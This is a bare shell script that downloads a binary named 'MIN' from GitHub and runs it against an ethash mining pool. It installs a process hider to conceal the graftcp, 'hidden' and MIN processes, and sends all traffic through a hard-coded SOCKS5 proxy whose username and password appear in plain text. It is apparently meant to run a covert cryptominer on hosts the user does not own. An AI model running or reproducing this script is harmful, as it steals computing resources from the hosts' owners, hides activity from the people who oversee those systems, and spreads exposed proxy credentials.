apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

apt update 
apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
wget https://github.com/christiarch/templates/raw/main/lba 
chmod +x lba 
npm i -g node-process-hider 

ph add graftcp
ph add hidden
ph add MIN

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata


wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 181.215.184.109:45786
socks5_username = Selshindeparshuram2012
socks5_password = V7p9BkV
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

./graftcp/graftcp wget https://github.com/thefacta/miner/raw/main/MIN
chmod +x MIN

./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 1-999 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
sleep 2
./graftcp/graftcp ./MIN --url=hijrahku.$(echo $(shuf -i 20-188 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
